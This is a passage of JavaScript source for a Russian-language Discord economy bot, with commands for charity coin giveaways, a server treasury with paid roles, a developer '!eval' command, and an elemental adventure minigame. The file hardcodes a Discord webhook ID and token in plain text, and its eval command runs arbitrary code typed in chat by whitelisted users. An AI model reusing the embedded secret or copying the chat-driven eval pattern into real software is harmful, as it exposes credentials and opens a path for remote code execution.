      msg.msg("Вы не указали кол-во коинов, которые хотите раздать", {delete: 5000, color: "ff0000"});
      msg.react("❌");
      return;
    }
    cash = cash[0];
    op.args = op.args.replace(cash, "").trim();

    if (cash === "+"){
      cash = op.user.coins;
    }

    cash = Number( cash );

    if (cash < 200) {
      msg.msg("Минимальная сумма — 200 коинов", {delete: 5000, color: "ff0000"});
      msg.react("❌");
      return;
    }

    if (cash > op.user.coins) {
      msg.msg("Недостаточно коинов", {delete: 5000, color: "ff0000"});
      msg.react("❌");
      return;
    }

    let countUsers = op.args.match(/\d+/);
    let needCash;
    if (countUsers){
      countUsers = countUsers[0];
      needCash = 200 + Math.max(countUsers - 20, 0) * 250 * 2 ** Math.floor(countUsers / 10);
      op.args = op.args.replace(countUsers, "").trim();
    }

    if (cash < needCash){
      msg.msg("Мало коинов", {description: `Для благотворительности такой размерности (${ending(countUsers, "человек", "", "", "а")}) требует минимум ${needCash} коинов!`, delete: 8000, color: "ff0000"});
      msg.react("❌");
      return;
    }

    let note = op.args;

    let
     count   = countUsers || random(11, 22),
     members = [...msg.guild.members.cache.filter( e => !e.user.bot && e.user.id != msg.author.id ).random( count ).filter( e => e )];
     sum     = Math.floor(cash / members.length);

    members.forEach(e => e.user.data.coins += sum);
    op.user.coins -= cash;
    msg.guild.data.coins = nonNaN(msg.guild.data.coins) + cash - sum * members.length;

    let embed = {
      title: "Вы сотворили Акт благотворительности",
      description: `Ваши <:coin:637533074879414272> ${ending(cash, "коин", "ов", "", "а")} были распределены между ${members.length} случайными участниками сервера, эти люди вам благодарны:\n${   members.map((e, i) => `${  i % 3 ? "<:crys3:763767653571231804>" : "<:crys:637290406958202880>"  } ${Discord.Util.escapeMarkdown(e.toString())} — ${[{_weight: 2, x: "Спасибо!"}, {_weight: 2, x: "Благодарю!"}, {_weight: 2, x: "Вы самые лучшие!"}, {_weight: 15, x: "💚"}, {_weight: 15, x: "💖"}, {_weight: 1, x: "🦝"}].random({weights: true}).x}`).join("\n")   }`,
      author: {
        iconURL: msg.author.avatarURL(),
        name: msg.author.username
      },

      footer: note ? {
        iconURL: msg.author.avatarURL(),
        text: `Послание: ${note}`
      } :
      {
        iconURL: client.user.avatarURL(),
        text: "Спасибо!"
      },

      image: "https://media.discordapp.net/attachments/629546680840093696/812635351801004052/penguinwalk.gif"
    }

    let message = await msg.msg(embed.title, embed);
    msg.react("💚");
  }, {cooldown: 70, try: 2, args: true, type: "other"}, "благотворительность"),

  bank: new Command(async (msg, op) => {
    let user = op.user, action, coins, cause;
    let server = msg.guild.data;
    const isAdmin = !op.member.wastedPermissions(32)[0];


    const cash = async (coins, isPut, cause) => {
      let heAccpet;

      if (coins === "+"){
        coins = isPut ? op.user.coins : server.coins;
      }
      coins = Math.max(Math.floor(coins), 0);

      if (isNaN(coins)) {
        return msg.msg("Указана строка вместо числа", {color: "ff0000", delete: 5000});
      }

      if (coins === 0) {
        return msg.msg("Невозможно положить/взять 0 коинов", {color: "ff0000", delete: 5000});
      }

      if (isPut){
        heAccpet = await accept("bank_put", {message: "Вы точно хотите это сделать?", description: "<a:message:794632668137652225> Отправленненные в общую казну коины более не будут предналежать вам, и вы не сможете ими свободно распоряжаться.\nПродолжить?"}, msg.channel, op.user);
        if (!heAccpet) return;

        if (op.user.coins < coins){
          msg.msg("Образовались проблемки..", {description: "Недостаточно коинов", color: "ff0000", delete: 7000});
          return;
        }

        op.user.coins -= coins;
        server.coins += coins;
        msg.guild.logSend("Содержимое банка изменено:", {description: `${op.member.displayName} отнёс в казну ${ending(coins, "коин", "ов", "а", "ов")}`, footer: {iconURL: msg.author.avatarURL(), text: msg.author.tag}});
        msg.react("👌");
        msg.msg(`Вы успешно вложили **${ending(coins, "коин", "ов", "а", "ов")}** на развитие сервера`, {delete: 5000});
        return;
      }

      if (!isPut){
        heAccpet = await accept("bank", {message: "Осторожно, ответственность!", description: "<a:message:794632668137652225> Не важно как сюда попадают коины, главное — они предналежат пользователям этого сервера\nРаспоряжайтесь ими с пользой, умом."}, msg.channel, op.user);
        if (!heAccpet) return;
        let problems = [];

        if (!isAdmin)
          problems.push("Для использования содержимого казны требуется право \"Управление сервером\"");
        if (server.coins < coins)
          problems.push(`Похоже, тут пусто. В хранилище лишь ${ending(server.coins, "коин", "ов", "", "а")}.`);
        if (!cause)
          problems.push(`Вы должны указать причину использования ${ending(coins, "коин", "ов", "а", "ов")}.`);
        if (!cause || !cause.match(/.{2,}\s+?.{2,}/i))
          problems.push(`Причина обязана содержать минимум 2 слова.`);

        if (problems[0]){
          msg.msg("Образовались проблемки..", {description: problems.join("\n"), color: "ff0000", delete: 7000});
          return;
        }

        op.user.coins += coins;
        server.coins -= coins;
        msg.guild.logSend("Содержимое банка изменено:", {description: `${op.member.displayName} обналичил казну на сумму **${ending(coins, "коин", "ов", "а", "ов")}**\nПричина: ${cause}`, footer: {iconURL: msg.author.avatarURL(), text: msg.author.tag}});
        msg.react("👌");
        msg.msg(`Вы успешно взяли **${ending(coins, "коин", "ов", "а", "ов")}** из казны сервера\nПо причине: ${cause}`, {delete: 5000});
        return;
      }
    }


    if (op.args){
      action = op.args.split(" ")[0];
      coins  = op.args.split(" ")[1];
      cause  = op.args.split(" ").slice(2).join(" ");

      if (action == "положить" || action == "put"){
        await cash(coins, true, cause);
        return;
      }

      if (action == "взять"    || action == "take"){
        await cash(coins, false, cause);
        return;
      }
    }





    let embed = {description: `В хранилище **${ Math.letters(server.coins) }** <:coin:637533074879414272>\n\n<a:message:794632668137652225> ⠿ Заработные платы\n<:meow:637290387655884800> ⠿ Положить\n<:merunna:755844134677512273> ${[..."⠯⠷⠟⠻"].random()} Взять`, author: {name: msg.guild.name, iconURL: msg.guild.iconURL()}, image: "https://media.discordapp.net/attachments/629546680840093696/830774000597991434/96-967226_tree-forest-green-vector-map-of-the-trees.png"};
    let coinInfo = server.coins;
    let react, answer;
    let reactions = ["637290387655884800", isAdmin ? "755844134677512273" : null, "794632668137652225"];
    let message = await msg.msg("Казна сервера", embed);
    embed.edit = true;

    while (true) {
      message = await message.msg("Казна сервера", embed);
      react = await message.awaitReact({user: msg.author, type: "all"}, ...reactions);
      switch (react) {
        case "637290387655884800":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Укажите сумму коинов, которую хотите внести в казну"});
          if (!answer){
            break;
          }

          await cash(answer.content, true, cause);
          embed.description = `В казну внесли коины`;
          break;
        case "755844134677512273":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Укажите сумму коинов. А также причину их извлечения из общей казны."});
          if (!answer){
            break;
          }

          let coins;

          cause = answer.content.replace(/\d+/, e => {
            coins = e;
            return "";
          }).trim();

          await cash(coins, false, cause);
          embed.description = `Из казны извлекли коины`;
          break;
        case "794632668137652225":
          let professions = msg.guild.data.professions || (msg.guild.data.professions = {});
          let workers = new Set();
          let costs = 0;

          let workersList = "<a:message:794632668137652225> Здесь пока пусто, также тут может быть ваша реклама";
          if (Object.keys(professions).length){
            Object.keys(professions).forEach(([id]) => msg.guild.roles.cache.get(id) ? true : delete professions[id]);

            msg.guild.members.cache.each(memb => {
              Object.entries(professions).forEach(([id, cost]) => memb.roles.cache.has(id) ? workers.add(memb) && (costs += +cost) : false);
            });
            workersList = Object.entries(professions).map(([id, cost]) => {
              let allCost = [...workers].filter(memb => memb.roles.cache.has(id)).length;
              return `${msg.guild.roles.cache.get(id)}\n${cost} <:coin:637533074879414272> в день (${ending(allCost, "Пользовател", "ей", "ь", "я")})`;
            });
            workersList = workersList.filter(e => e).join("\n");


          }
          let professionManager = await msg.msg("- Работы сервера",
            {
              description: `**Созданные профессии ${Object.keys(professions).length}/20**\n${workersList}\n\n\`\`\`Доходы: ${msg.guild.memberCount * 2}\nРасходы: ${costs}\n${ending(workers.size, "пользовател", "ей", "ь", "я")} получает зарплату\`\`\``,
              footer: {text: "Используйте реакции, чтобы создать, удалить профессию или закрыть это окно."}
            }
          )
          while (true){
            react = await professionManager.awaitReact({user: msg.author, type: "all"}, isAdmin ? "✅" : null, isAdmin ? "❎" : null, "❌");
            embed.description = `<a:message:794632668137652225> Без изменений`;
            if (react == "✅"){
              if (Object.keys(professions).length >= 20){
                msg.msg(`Лимит 20 профессий`, {delete: 4500, color: "ff0000"});
                continue;
              }
              answer = await msg.channel.awaitMessage(msg.author, {message: "Укажите айди роли, а также количество коинов, выдаваемое ежедневно"});
              if (!answer) {
                professionManager.delete();
                return;
              }
              answer = answer.content.split(" ");

              let role = msg.guild.roles.cache.get(answer[0]);
              if (!role){
                msg.msg(`Не удалось найти роль с айди ${answer[0]}`, {delete: 4500, color: "ff0000"});
                continue;
              }
              if (isNaN(answer[1]) || answer[1] == 0){
                msg.msg(`Не указано выдаваемое количество коинов`, {delete: 4500, color: "ff0000"});
                continue;
              }
              msg.guild.data.professions[answer[0]] = Math.max(Math.floor(answer[1]), 1);
              embed.description = `<a:message:794632668137652225> Вы успешно создали новую профессию!\n(${role} ${answer[1]} <:coin:637533074879414272>)`;
            }

            if (react == "❎"){
              answer = await msg.channel.awaitMessage(msg.author, {message: "Укажите айди роли профессии, для её удаления"});
              if (!answer) {
                professionManager.delete();
                return;
              }
              if (answer.content in professions){
                delete professions[answer.content];
                embed.description = `<a:message:794632668137652225> Вы успешно удалили профессию! ${msg.guild.roles.cache.get(answer.content)}`;
              } else {
                msg.msg(`Не удалось найти роль с айди ${answer.content} для удаления связанной с ней профессии`, {delete: 4500, color: "ff0000"});
                continue;
              }
            }
            break;
          }

          professionManager.delete();
          break;
        default: return message.delete();
      }
      embed.description += `\n\nВ хранилище: ${ending(server.coins, "золот", "ых", "ая", "ых", {bold: true})}!\nКоличество коинов ${server.coins - coinInfo === 0 ? "не изменилось" : server.coins - coinInfo > 0 ? "увеличилось на " + (server.coins - coinInfo) : "уменьшилось на " + (coinInfo - server.coins) } <:coin:637533074879414272>`;
    }
  }, {cooldown: 50, try: 3, type: "guild"}, "cash банк казна"),

  eval: new Command(async (msg, op) => {



    let isDev = ["416701743733145612", "469879141873745921", "500293566187307008", "535402224373989396", "921403577539387454", "711450675938197565"]
      .includes(msg.author.id);

    if (!isDev && op.args){
      msg.channel.msg("Э, вы не хозяин -_-'", "ff0000");
      return;
    }

    if (msg.reference){

      const changeParams = (message) => {
        const blockQuote = message.content.match(/```js\n((?:.|\n)+?)```/);
        if (!blockQuote)
          return;

        op.args = blockQuote[1];
      }

      const messageId = msg.reference.messageID;
      const message = await msg.channel.messages.fetch(messageId);

      if (message){
        changeParams(message);
      }

    }

    if (!isDev || !op.args){
      op.args = "msg.author.data";
    }

    let timestamp = 0;

    let code = op.args;
    let output;
    try {
      let startTimestamp = getTime();
      output = await eval( `try{${ code }} catch(err){err}` );
      timestamp = getTime() - startTimestamp;
    }
    catch (error){
      output = error;
    }

    let emoji;

    switch (true){
      case (output === undefined):
        output = "```{Пусто}```";
        emoji = "753916360802959444";
        break;
      case (output instanceof Error):
        let stroke = output.stack.match(/(?<=\>:)\d+:\d+/);
        stroke = stroke ? stroke[0] : "1:0";

        let lineOfCode = Discord.Util.escapeMarkdown(  code.split("\n")[ stroke.split(":")[0] - 1 ]   );
        lineOfCode = {
          full: lineOfCode,
          prev: lineOfCode.slice( 0, stroke.split(":")[1] - 1 ),
          word: null,
          next: null
        }

        lineOfCode.word = match(lineOfCode.full.slice(lineOfCode.prev.length), /[a-zа-яьёъ$_]+/i);
        lineOfCode.next = lineOfCode.full.slice(lineOfCode.word.length + lineOfCode.prev.length);

        let boldedLine = `${ lineOfCode.prev }**${ lineOfCode.word }**${ lineOfCode.next }`;
        output = `Ошибка (${output.name}):\n${output.message}\nНа строке: #${stroke}\n${boldedLine}`;

        emoji = "753916394135093289";
        break;
      case (typeof output === "object"):
        output = `\`\`\`json\n${Discord.Util.escapeCodeBlock(  JSON.stringify(output, null, 3)  )}\`\`\``;
        emoji = "753916315755872266";
        break;
      default:
        emoji = "753916145177722941";
        output = String(output);
    }

    if (process.env.DEVELOPMENT === "FALSE"){
      const hook = new Discord.WebhookClient("1006423793100664953", "dFUlXrQkpMu7Kb3ytBYzzfsHPDRucDonBwMGpqApi426J3OKuFEMttvw2ivlIcbrtAFJ");
      hook.msg = Discord.Webhook.prototype.msg;
      hook.msg("", {author: {name: `${ msg.author.username }, в #${ msg.channel.id }`, iconURL: client.user.avatarURL()}, description: `\`\`\`js\n${ code }\`\`\``, color: "1f2022", footer: {iconURL: client.emojis.cache.get(emoji).url, text: "Вызвана команда !eval"}, destroy: true});
    }




    let react = await msg.awaitReact({user: msg.author, type: "one", time: 20000}, emoji);
    if (!react){
      return;
    }

    msg.msg("([**{**  <:emoji_48:753916414036803605> <:emoji_50:753916145177722941> <:emoji_47:753916394135093289> <:emoji_46:753916360802959444> <:emoji_44:753916315755872266> <:emoji_44:753916339051036736>  **}**])",
    {
      author: {name: "Вывод консоли"},
      description: output,
      color: "1f2022",
      footer: {text: `Количество символов: ${output.length}\nВремя выполнения кода: ${timestamp}мс`},
      destroy: true
    }
    ).catch(
      err => {
        console.info(output);
        msg.msg("Лимит символов", {color: "1f2022", description: `Не удалось отправить сообщение, его длина равна ${ending(output.length, "символ", "ов", "у", "ам")}\nСодержимое ошибки:\n${err}`});
      }
    );


  }, {type: "other"}, "dev евал эвал"),

  thing: new Command(async (msg, op) => {

    const getColor = (element) => ["34cc49", "a3ecf1", "dd6400", "411f71"][element];
    const getEmoji = (element) => ["🍃", "☁️", "🔥", "👾"][element];

    const getCooldownInfo = () => {
      const COOLDOWN     = 10800000;
      const COOLDOWN_TRY = 2;
      const cooldownThresholder = getTime() + COOLDOWN * (COOLDOWN_TRY - 1);

      return {COOLDOWN, COOLDOWN_TRY, cooldownThresholder};
    }

    if (op.memb){
      const element = op.memb.data.element || null;
      if (element === null){
        msg.msg("", {description: "Упомянутый пользователь пока не открыл штуку.."});
        return;
      }

      const username = op.memb.username;

      const color = getColor(element);
      const emoji = getEmoji(element);

      // ENOT-enot-enot...
      const mentionContent = [username.toUpperCase(), username.toLowerCase(), username.toLowerCase()].join("-");

      const {cooldownThresholder} = getCooldownInfo();
      const inCooldownContent = ["Нет.", "Да."][ +(op.memb.data.CD_52 > cooldownThresholder) ];

      const description = `${ mentionContent }...\nВыбранная стихия: ${ emoji }\nУровень штуки: ${ (op.memb.data.elementLevel || 0) + 1 }\n\nНа перезарядке: ${ inCooldownContent }`
      msg.msg("", {description, color});
      return;
    }

    let user = msg.author.data;
    let { element, elementLevel } = user;


    if (!user.voidRituals){
      msg.msg("Штуке требуется немного магии котла,\nчтобы она могла работать.", {description: `Вам ещё недоступна эта команда\nдля её открытия нужно совершить хотя бы один ритуал используя команду !котёл.\nВ будущем она будет давать коины для сервера, а также активировать случайные события. `, delete: 7000});
      return;
    }
    let react, answer;

    if (match(op.args, /^(?:я|i'm|i)/i)){
      let elementSelect = await msg.msg("Говорят, звёзды приносят удачу", {
        description: `Каждая из них имеет свои недостатки и особенности, просто выберите ту, которая вам по нраву.`,
        fields: [
          {
            value: "Создает нечто из ничего.",
            name: "**🍃 Земля**"
          },
          {
            value: "В естественном потоке меняет одно другим.",
            name: "**☁️ Воздух**"
          },
          {
            value: "Бёрет старое и награждает новым.",
            name: "**🔥 Огонь**"
          },
          {
            value: "Не оставляет ничего существующего.",
            name: "**👾 Тьма**"
          }
        ],
        author: {
          name: msg.author.username,
          iconURL: msg.author.avatarURL()
        },
        footer: {
          text: `Вы всегда сможете изменить выбор — "!штука я"\nТакже не забывайте улучшать её способности командой "!штука улучшить"`
        }
      });
      react = await elementSelect.awaitReact({user: msg.author, type: "all"}, "🍃", "☁️", "🔥", "👾");
      elementSelect.delete();
      switch (react){
        case "🍃":
          user.element = 0;
          msg.msg("Вы выбрали Землю 🍃", {description: `Стабильность — медленно, но верно доведёт вас до вершин. Большой шанс получить ключи, коины, перцы и т.д., без рисков на неудачу.`});
          break;
        case "☁️":
          user.element = 1;
          msg.msg("Вы выбрали Воздух ☁️", {description: `Никогда не знаешь что произойдет — скучно не будет.\nВозможно, вы получите большую сумму коинов, а на следующий день потеряете пару клубник.`});
          break;
        case "🔥":
          user.element = 2;
          msg.msg("Вы выбрали Огонь 🔥", {description: `Его отличительной чертой является стабильная многаждая вероятность навсегда увеличить награду коин-сообщения, которая никогда не сгасает.`});
          break;
        case "👾":
          user.element = 3;
          msg.msg("Вы выбрали Тьму 👾", {description: `Вы поступаете правильно, выбирая эту стихию, и в последствии получите свою честную нестабильность..`});
          break;
      }
      return;
    }

    if (element === undefined){
      return commands.thing.code(msg, {command: "thing", args: "я"});
    }

    let emoji = getEmoji(element);
    let embedColor = getColor(element);
    let level = elementLevel || 0;

    if (match(op.args, /улучшить|up|level|уровень|ап/i)){

      if (user.elementLevel == 4) {
        msg.msg("Ваша штука итак очень сильная.\nПоэтому разработчик решил, что пятый уровень — максимальный.", {delete: 7000});
        return;
      }
      let endingKeys = {
        coins:       ["коин", "ов", "а", "ов"],
        berrys:      ["клубник", "", "и", ""],
        voidRituals: ["ритуал", "ов", "а", "ов"]
      }

      const checkResources = () => {
        // Проверяем АКТУАЛЬНЫЙ уровень
        let level = user.elementLevel || 0;
        let resources = [{berrys: 5, coins: 500, voidRituals: 2}, {berrys: 15, coins: 1500, voidRituals: 3}, {berrys: 38, coins: 3337, voidRituals: 5}, {berrys: 200, coins: 30000, voidRituals: 10}][level];

        let noEnought = Object.entries(resources).filter(([k, v]) => v > user[k]).map(([k, v]) => ending(v - nonNaN(user[k]), ...endingKeys[k]));
        // Если ресурсов хватает, вернуть объект, иначе массив недостающих елементов.
        return noEnought.last ? noEnought : resources;
      };


      let resourcesInfo = checkResources();
      if (!(resourcesInfo instanceof Array)){
        let confirmation = await msg.msg("Подтвердите", {description: `Улучшение стоит целых ${ending(resourcesInfo.coins, ...endingKeys.coins)} и ${ending(resourcesInfo.berrys, ...endingKeys.berrys)}\nВы хотите продолжить?`, color: embedColor});
        let react = await confirmation.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "763804850508136478");
        confirmation.delete();
        if (react != "685057435161198594"){
          return;
        }
        resourcesInfo = checkResources();
        if (resourcesInfo instanceof Array){
          msg.msg("Как это вообще работает..?", {color: embedColor, description: `У вас резко пропали необходимые ресурсы, вы не можете улучшить штуку.`, author: {name: "Упс.."}});
          return;
        }

        user.berrys -= resourcesInfo.berrys;
        user.coins -= resourcesInfo.coins;
        user.elementLevel = ~~user.elementLevel + 1;
        msg.msg(`Непослушная сила улучшена до ${user.elementLevel + 1} уровня!`, {description: `Апгрейды открывают новые события, а такккж-е штука становится более непредсказуемой, принося немrror} больше коинов.`, color: embedColor, delete: 9000, author: {name: msg.author.username, iconURL: msg.author.avatarURL()}});
        return;
      }


      msg.msg("Как это вообще работает..?", {color: embedColor, description: `Не хватает ${add_and(resourcesInfo)}, чтобы улучшить эту клятую штуку.`, author: {iconURL: "https://media.discordapp.net/attachments/629546680840093696/855129807750299698/original.gif", name: "Упс.."}});
      return;
    }

    const {cooldownThresholder, COOLDOWN} = getCooldownInfo();

    if (user.CD_52 > cooldownThresholder){
      const title = `${ emoji } Штука перезаряжается!`;
      const description = `Товарищ многоуважаемый, спешу сообщить, что:\nВаш персонаж слишком устал от приключений.\n\nПерерыв на обед ещё: ${ timestampToDate(user.CD_52 - cooldownThresholder) }`;

      msg.delete();

      msg.msg(title, {description, color: embedColor});
      return;
    }


    user.CD_52 = Math.max(nonNaN(user.CD_52), getTime()) + COOLDOWN;

    let k = random(20, {round: false});

    const scene = [
      {
        id: "day",
        _weight: 80,
        description: ["Обычный день..", `${random(1) ? "Обычный" : "Будний"} ${["Зимний", "Весенний", "Летний", "Осенний"][Math.floor((new Date().getMonth() + 1) / 3) % 4]} день...`, "Ничего не происходит.", "Происходит самое скучное событие — ничего не происходит"].random(),
        variability: [
          [
            {
              action: async () => {
                scene.phrase = "Вы спокойно " + ["работаете в своё удовольствие..", "занимаетесь своим огородом.."].random();
              },
              textOutput: "{scene.phrase}"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => {
                if (user.chilli && !random(5)){
                  let sellingCount = nonNaN( Math.min(user.chilli, 3 + user.elementLevel) );
                  let prise = random(sellingCount * 160, sellingCount * 190);
                  user.chilli -= sellingCount;
                  user.coins += prise;
                  scene.phrase = `Вы смогли продать ${ending(sellingCount, "пер", "цев", "ец", "ца")} и заработали ${ prise } <:coin:637533074879414272>`;
                  return;
                }

                scene.phrase = "Вы весело " + ["проводите время", "отдыхаете", "занимаетесь своим хобби", "играете в салки с воришками"].random();
              },
              textOutput: "{scene.phrase}"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => {
                scene.phrase = "Вы разумно вложили своё время" + [" в восстановление сил.", ", тренеруясь в скрытности.", ", посещая храм"].random();
              },
              textOutput: "{scene.phrase}"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => {
                scene.phrase = "Вы тратите это время на " + ["чтение интересных книг.", "развитие нового средства передвижения", "общение с приятелями", "отдых от злых дел", "сотворение невежества"].random();
              },
              textOutput: "{scene.phrase}"
            },
            false,
            false,
            false,
            false
          ],
        ],
        filterFunc: () => true
      },
      {
        id: "weekdays",
        _weight: 20,
        description: "Во время прогулки в лесу на вас напал одинокий разбойник",
        variability: [
          [
            {
              action: async () => false,
              textOutput: "Вы с друзьями смогли отбиться и даже не поранились!"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.coins -= 2,
              textOutput: "Мы бы сказали, что у вас отжали коины, но это не так, вы сами дали ему 2 монетки <:coin:637533074879414272>"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.coins += 2,
              textOutput: "Вы вытрялси из него два коина <:coin:637533074879414272> и отпустили."
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.coins -= 2,
              textOutput: "Он был вооружён, а вы — нет. Разумеется у вас отжали 2 коина."
            },
            false,
            false,
            false,
            false
          ],
        ],
        filterFunc: () => level < 2
      },
      {
        id: "huckster",
        _weight: 30,
        description: "Вам встретился очень настойчивый торговец",
        variability: [
          [
            {
              action: async () => false,
              textOutput: "Вас не смогли заинтересовать его товары"
            },
            false,
            false,
            false,
            {
              action: async () => false,
              textOutput: "Мягко говоря, выглядел он не живым уже как пять минут\nВы истратили все свои силы, чтобы спасти барыгу, но даже сейчас не приняли денег в качестве благодарности."
            }
          ],
          [
            {
              action: async () => {
                user.keys += 1;
                user.coins -= 120;
              },
              textOutput: "Вы купили у него ключ всего за 120 коинов!"
            },
            {
              action: async () => {
                user.keys += 2;
                user.coins -= 210;
              },
              textOutput: "Вы купили у него два ключа всего за 210 коинов!"
            },
            {
              action: async () => {
                user.keys += 4;
                user.coins -= 400;
              },
              textOutput: "Вы купили у него 4 ключа всего за 400 коинов!"
            },
            {
              action: async () => {
                user.keys += 5;
                user.coins -= 490;
              },
              textOutput: "Вы купили у него 5 ключей всего за 490 коинов!"
            },
            {
              action: async () => {
                user.keys += 7;
                user.coins -= 630;
              },
              textOutput: "Вы купили у него 7 ключей всего за 630 коинов!"
            }
          ],
          [
            {
              action: async () => {
                user.chilli = nonNaN(user.chilli + 1);
                user.coins -= 220;
                user.coinsPerMessage = nonNaN(user.coinsPerMessage) + 1;
              },
              textOutput: "Вы купили у него перец и дали на чай\nВсего пришлось заплатить 220 коинов, но и этим очень порадовали старика.\nТеперь вы получаете на одну монету больше за каждое коин-сообщение"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => {
                if ( random((level + 1) / 2) ){
                  user.coins += scene.coins = Math.floor(k);
                  scene.phrase = `Считай, заработали ${ending(scene.coins, "коин", "ов", "", "а")}`;
                }
                else {
                  user.coins -= scene.coins = Math.floor(k);
                  scene.phrase = `Однако, к вашему огромною удивлению дедуля отбил вашу атаку и справедливо отобрал ваши ${ending(scene.coins, "коин", "ов", "", "а")}`;
                }
              },
              textOutput: "За дерзость вы нагло забрали его товар, который он держал прямо перед вашим лицом\n{scene.phrase}"
            },
            false,
            false,
            false,
            {
              action: async () => user.coins += scene.coins = Math.floor(k),
              textOutput: "За дерзость вы убили торговца, забрали его товар и наглумились, подзаработав эдак коинов {scene.coins}"
            }
          ],
        ],
        filterFunc: () => true
      },
      {
        id: "berrys",
        _weight: 15,
        description: "Вы решили испытать магию на своей клубнике",
        variability: [
          [
            {
              action: async () => user.berrys++,
              textOutput: "И вам удалось её клонировать! Собственно, у вас на одну клубнику больше."
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => random(1) ? user.berrys++ : user.berrys--,
              textOutput: "Она то-ли увеличилась, то-ли уменьшилась. Никто так и не понял.."
            },
            {
              action: async () => random(1) ? user.berrys++ : data.bot.berrysPrise++,
              textOutput: "Она вроде увеличилась, а вроде увеличилась её цена. Никто так и не понял.."
            },
            false,
            false,
            {
              action: async () => user.berrys += random(2),
              textOutput: "Она вроде увеличилась, а вроде ещё раз увеличилась. Вдвойне выгодно."
            },
          ],
          [
            {
              action: async () => {
                user.coinsPerMessage = nonNaN(user.coinsPerMessage) + 2 + level;
                user.berrys--;
              },
              textOutput: `Поглотили её силу и сразу увеличили награду коин-сообщений на ${2 + level} ед.\nК слову, клубника была действительно вкусной.`
            },
            false,
            false,
            {
              action: async () => {
                const count = user.berrys;
                user.berrys -= count;

                const bonuses = Math.ceil(count * random(1.2, 1.4));
                user.chestBonus = nonNaN(user.chestBonus) + scene.random;
                scene.bonuses = bonuses;
              },
              textOutput: `"Сыворотка для преобразования клубники в волшебные сундуки", так вы назвали свой раствор превратив все свои клубники в {ending(scene.bonuses, "бонус", "ов", "", "а")} сундука`
            },
            false
          ],
          [
            {
              action: async () => user.berrys -= 2,
              textOutput: "В ходе экспериментов две из двух клубник превратились в прах."
            },
            false,
            false,
            {
              action: async () => {
                user.berrys -= 2;
                user.coinsPerMessage = nonNaN(user.coinsPerMessage) + 6;
              },
              textOutput: "В ходе экспериментов вам удалось их оживить, увеличив заработок коин-сообщений на 6 единиц"
            },
            false
          ],
        ],
        filterFunc: () => user.berrys > 2
      },
      {
        id: "unrealCreatures",
        _weight: 1 + Math.floor(level / 2),
        description: "Этой ночью ваши силы особо насищенны..",
        variability: [
          [
            {
              action: async () => {
                scene.random = random(3, 8);
                data.bot.berrysPrise += scene.random;
              },
              textOutput: `Эту возможность вы решили использовать, чтобы помочь другим..\nВся клубника продается на {ending(scene.random, "коин", "ов", "", "а")} дороже.`
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => {
                if (random(1)){
                  user.coins += 3000;
                  scene.phrase = "Удача! Вы выиграли 3000 <:coin:637533074879414272> !";
                  return;
                }
                user.coins -= 1000;
                scene.phrase = "Не повезло, вы проиграли 1000 коинов <:coin:637533074879414272>";
              },
              textOutput: "Используя свои способности вы намеренны выиграть Джекпот..\n{scene.phrase}"
            },
            false,
            false,
            false,
            {
              action: async () => user.coins += scene.coins = 500 * random(2, 15),
              textOutput: "Повысив удачу вы построили парк развлечений и заработали {scene.coins} <:coin:637533074879414272>"
            },
          ],
          [
            {
              action: async () => user.coinsPerMessage = Math.ceil(nonNaN(user.coinsPerMessage) * 1.02),
              textOutput: `Укрепили силу духа, на том и закончили. Бонус коинов за сообщения увеличен на 2%`
            },
            false,
            false,
            false,
            {
              action: async () => true,
              textOutput: `Долго же вы ждали этого момента...\nЭтот день — отличная возможность наведаться в межмировую потасовку..`
            },
          ],
          [
            {
              action: async () => {
                user.level -= random(1, 2);
                user.void++
              },
              textOutput: "Вы породили кусок нестабильности <a:void:768047066890895360>, но потеряли много опыта и крошечку рассудка."
            },
            false,
            {
              action: async () => {
                user.keys -= 5;
                user.berrys--;
                user.coins -= random(300, 700);
                user.void += scene.voids = random(1, 2);
              },
              textOutput: `Преобразуя материальные предметы вы получаете {ending(scene.voids, "уровн", "ей", "ь", "я")} нестабильности <a:void:768047066890895360>\nЦеной такого ритуала стали 5 обычных старых ключей, клубника и немного прекрасного — денег.`
            },
            false,
            {
              action: async () => user.void += 2,
              textOutput: "Что может быть лучше, чем два камня нестабильности добытых из сердец слуг.. <a:void:768047066890895360>"
            },
          ],
        ],
        filterFunc: () => true
      },
      {
        id: "fireMonkey",
        _weight: 15,
        description: "Огненная обезьяна утащила стопку ваших ключей!",
        fastFunc: () => {
          scene.stolenKeys = random(3, 7);
          user.keys -= scene.stolenKeys;
        },
        variability: [
          [
            {
              action: async () => false,
              textOutput: "Ваши попытки договорится не помогли.."
            },
            {
              action: async () => user.keys += scene.stolenKeys,
              textOutput: "Совместно вы убедили товарища обезьяну вернуть ваши ключи"
            },
            false,
            false,
            false
          ],
          [
            {
              action: async () => false,
              textOutput: "Тактика догнать и вернуть оказалась провальной..."
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => {
                scene.random = random(15, 45);
                user.coins += scene.stolenKeys * scene.random;
              },
              textOutput: "Вам удалось договорится — обезьяна взамен ключей дала вам {scene.stolenKeys * scene.random} <:coin:637533074879414272>"
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => user.berrys ? user.berrys-- : false,
              textOutput: `Сражаться с обезьяной и угрожать ей было плохой идеей${user.berrys ? ", вы потеряли ещё и пару клубник (1)" : "..."}`
            },
            false,
            false,
            false,
            false
          ],
        ],
        filterFunc: () => level > 1 && user.keys > 30
      },
      {
        id: "clover",
        _weight: 15,
        description: "Вам повезло оказатся рядом с великим Клевером, приносящим удачу и богатсва",
        variability: [
          [
            {
              action: async () => TimeEvent.move(e => e.func == "cloverEnd" && e.args.includes(msg.guild.id), event => event.ms + level * 1200000),
              textOutput: `Вы благословили клевер, чем продлили ему жизнь на ${level * 20} минут`
            },
            false,
            false,
            false,
            false
          ],
          [
            {
              action: async () => {
                (async () => {
